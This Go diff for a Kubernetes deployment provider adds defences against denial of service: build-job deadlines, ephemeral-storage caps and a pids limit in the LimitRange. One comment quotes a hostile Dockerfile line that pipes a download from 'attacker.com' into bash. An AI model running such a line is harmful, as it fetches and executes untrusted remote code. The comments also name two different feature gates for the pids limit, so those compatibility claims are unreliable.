@@ -66,6 +66,33 @@ const (
 	// seccompRuntimeDefault requests the container runtime's default seccomp
 	// profile (equivalent to Docker's default profile on most runtimes).
 	seccompRuntimeDefault = corev1.SeccompProfileTypeRuntimeDefault
+
+	// buildJobActiveDeadlineSecs is the hard wall-clock timeout applied to every
+	// Kaniko build Job (both single-app and stack paths).
+	//
+	// Without this, a malicious or slow Dockerfile (e.g. RUN sleep 1e9) holds a
+	// build slot indefinitely. k8s automatically kills the pod and marks the Job
+	// as failed when the deadline is reached, freeing the slot and preventing
+	// DoS via unbounded build-queue saturation.
+	//
+	// 600 seconds (10 minutes) is generous for a real npm/pip/go install;
+	// reduce if the median real-world build time warrants it.
+	buildJobActiveDeadlineSecs = int64(600)
+
+	// pidsLimitPerContainer is the maximum number of concurrent processes a
+	// customer container may own. Applied as a named resource in the LimitRange
+	// Default map.
+	//
+	// The 256Mi memory limit already backstops a naive fork-bomb (allocating
+	// processes costs memory), but an explicit pids cap blocks fork attacks that
+	// stay below the memory threshold via short-lived processes. 1024 is
+	// generous for a web service, tight enough to cap any practical fork bomb.
+	//
+	// k8s LimitRange supports "pids" as a resource name since k8s 1.20; the
+	// feature gate PodAndContainerStatsFromCRI must be enabled on the kubelet.
+	// On older or misconfigured clusters the API will reject the LimitRange item
+	// with a validation error — the caller handles this gracefully (logs + skips).
+	pidsLimitPerContainer = "1024"
 )
 
 // customerContainerSecCtx returns the SecurityContext applied to every
@@ -557,10 +584,26 @@ func (p *K8sProvider) createResourceQuota(ctx context.Context, appID, tier strin
 
 // createLimitRangeForNS installs per-pod default resource requests/limits in the
 // given namespace so pods without explicit resources get sensible defaults.
+//
+// Gap 1 fix (disk fill / noisy-neighbour DoS): the LimitRange now includes
+// ephemeral-storage default + defaultRequest so that any customer container
+// that does NOT set explicit resources (or whose Deployment falls through the
+// applyDeploymentInNS path) still gets a storage cap. This is a defence-in-
+// depth backstop; applyDeploymentInNS and createStackDeployment ALSO set
+// explicit ephemeral-storage on every container spec.
+//
+// Gap 3 (pids fork-bomb defence): adds a "pids" default to the LimitRange.
+// Supported since k8s 1.20 with the SupportPodPidsLimit feature gate (on by
+// default from 1.24+). On older clusters the API rejects the item; we log and
+// fall back gracefully to a LimitRange without the pids cap rather than
+// aborting namespace setup.
 func (p *K8sProvider) createLimitRangeForNS(ctx context.Context, ns, tier string) error {
 	memReq, memLimit, cpuReq := compute.TierResources(tier)
+	ephReq, ephLimit := compute.TierEphemeralStorage(tier)
 
-	lr := &corev1.LimitRange{
+	// Attempt to include a pids limit (k8s 1.20+ with feature gate enabled).
+	// If the API rejects it, fall back to a LimitRange without the pids cap.
+	lrWithPids := &corev1.LimitRange{
 		ObjectMeta: metav1.ObjectMeta{
 			Name:      "instant-limits",
 			Namespace: ns,
@@ -570,18 +613,55 @@ func (p *K8sProvider) createLimitRangeForNS(ctx context.Context, ns, tier string
 				{
 					Type: corev1.LimitTypeContainer,
 					Default: corev1.ResourceList{
-						corev1.ResourceMemory: resource.MustParse(memLimit),
-						corev1.ResourceCPU:    resource.MustParse(cpuReq),
+						corev1.ResourceMemory:                         resource.MustParse(memLimit),
+						corev1.ResourceCPU:                            resource.MustParse(cpuReq),
+						corev1.ResourceEphemeralStorage:               resource.MustParse(ephLimit),
+						corev1.ResourceName("pids"):                   resource.MustParse(pidsLimitPerContainer),
 					},
 					DefaultRequest: corev1.ResourceList{
-						corev1.ResourceMemory: resource.MustParse(memReq),
-						corev1.ResourceCPU:    resource.MustParse(cpuReq),
+						corev1.ResourceMemory:           resource.MustParse(memReq),
+						corev1.ResourceCPU:              resource.MustParse(cpuReq),
+						corev1.ResourceEphemeralStorage: resource.MustParse(ephReq),
 					},
 				},
 			},
 		},
 	}
-	_, err := p.clientset.CoreV1().LimitRanges(ns).Create(ctx, lr, metav1.CreateOptions{})
+
+	_, err := p.clientset.CoreV1().LimitRanges(ns).Create(ctx, lrWithPids, metav1.CreateOptions{})
+	if err == nil || apierrors.IsAlreadyExists(err) {
+		return nil
+	}
+
+	// Pids resource not supported on this cluster — fall back without it.
+	// Log so the operator knows the partial coverage.
+	slog.Warn("createLimitRangeForNS: pids resource rejected by API server; creating LimitRange without pids cap (k8s < 1.20 or feature gate disabled)",
+		"namespace", ns, "error", err)
+
+	lrNoPids := &corev1.LimitRange{
+		ObjectMeta: metav1.ObjectMeta{
+			Name:      "instant-limits",
+			Namespace: ns,
+		},
+		Spec: corev1.LimitRangeSpec{
+			Limits: []corev1.LimitRangeItem{
+				{
+					Type: corev1.LimitTypeContainer,
+					Default: corev1.ResourceList{
+						corev1.ResourceMemory:           resource.MustParse(memLimit),
+						corev1.ResourceCPU:              resource.MustParse(cpuReq),
+						corev1.ResourceEphemeralStorage: resource.MustParse(ephLimit),
+					},
+					DefaultRequest: corev1.ResourceList{
+						corev1.ResourceMemory:           resource.MustParse(memReq),
+						corev1.ResourceCPU:              resource.MustParse(cpuReq),
+						corev1.ResourceEphemeralStorage: resource.MustParse(ephReq),
+					},
+				},
+			},
+		},
+	}
+	_, err = p.clientset.CoreV1().LimitRanges(ns).Create(ctx, lrNoPids, metav1.CreateOptions{})
 	if err != nil && !apierrors.IsAlreadyExists(err) {
 		return fmt.Errorf("create limit range in %q: %w", ns, err)
 	}
@@ -631,9 +711,10 @@ func (p *K8sProvider) Deploy(ctx context.Context, opts compute.DeployOptions) (*
 	svcName := serviceName(opts.AppID)
 
 	memReq, memLimit, cpuReq := compute.TierResources(opts.Tier)
+	ephReq, ephLimit := compute.TierEphemeralStorage(opts.Tier)
 
 	// Step 6: Create Deployment in the per-deployment namespace.
-	if err := p.applyDeploymentInNS(ctx, ns, deployName, imageTag, opts.EnvVars, opts.Port, memReq, memLimit, cpuReq); err != nil {
+	if err := p.applyDeploymentInNS(ctx, ns, deployName, imageTag, opts.EnvVars, opts.Port, memReq, memLimit, cpuReq, ephReq, ephLimit); err != nil {
 		return nil, fmt.Errorf("k8s.Deploy: apply deployment: %w", err)
 	}
 
@@ -1039,6 +1120,13 @@ func (p *K8sProvider) createKanikoJob(ctx context.Context, ns, jobName, ctxSecre
 		Spec: batchv1.JobSpec{
 			BackoffLimit:            &backoff,
 			TTLSecondsAfterFinished: &ttl,
+			// Gap 2 fix (build pod timeout): cap the wall-clock time a Kaniko
+			// build Job may run. A malicious or pathological Dockerfile (e.g.
+			// RUN curl attacker.com | bash; sleep 1e9) would otherwise hold a
+			// build slot forever. k8s kills the pod and marks the Job Failed
+			// when the deadline fires — the caller's waitForJobComplete sees the
+			// Failed condition and returns an error to the handler.
+			ActiveDeadlineSeconds: func() *int64 { v := buildJobActiveDeadlineSecs; return &v }(),
 			Template: corev1.PodTemplateSpec{
 				Spec: corev1.PodSpec{
 					RestartPolicy: corev1.RestartPolicyNever,
@@ -1130,12 +1218,20 @@ func (p *K8sProvider) waitForJobComplete(ctx context.Context, ns, jobName string
 
 // applyDeploymentInNS creates or updates the k8s Deployment for an app in the
 // given namespace (the per-deployment namespace).
+//
+// Gap 1 fix (disk fill / noisy-neighbour DoS): the container spec now carries
+// explicit ephemeral-storage request + limit so k8s evicts only THIS pod when
+// it exceeds its disk budget instead of allowing it to fill the node disk and
+// trigger cluster-wide DiskPressure. The LimitRange backstops any pod that
+// bypasses this function, but belt-and-braces: every Deployment we create sets
+// it explicitly.
 func (p *K8sProvider) applyDeploymentInNS(
 	ctx context.Context,
 	ns, name, imageTag string,
 	envVars map[string]string,
 	port int,
 	memReq, memLimit, cpuReq string,
+	ephReq, ephLimit string,
 ) error {
 	replicas := int32(1)
 	// PullAlways because images are pushed under a single :latest tag — without
@@ -1191,13 +1287,18 @@ func (p *K8sProvider) applyDeploymentInNS(
 							// RunAsNonRoot and ReadOnlyRootFilesystem are intentionally omitted
 							// — see customerContainerSecCtx for rationale.
 							SecurityContext: customerContainerSecCtx(),
+							// Gap 1 fix: include ephemeral-storage so k8s evicts THIS pod
+							// when it fills its disk quota instead of filling the node
+							// disk and triggering cluster-wide DiskPressure eviction.
 							Resources: corev1.ResourceRequirements{
 								Requests: corev1.ResourceList{
-									corev1.ResourceMemory: resource.MustParse(memReq),
-									corev1.ResourceCPU:    resource.MustParse(cpuReq),
+									corev1.ResourceMemory:           resource.MustParse(memReq),
+									corev1.ResourceCPU:              resource.MustParse(cpuReq),
+									corev1.ResourceEphemeralStorage: resource.MustParse(ephReq),
 								},
 								Limits: corev1.ResourceList{
-									corev1.ResourceMemory: resource.MustParse(memLimit),
+									corev1.ResourceMemory:           resource.MustParse(memLimit),
+									corev1.ResourceEphemeralStorage: resource.MustParse(ephLimit),
 								},
 							},
 						},
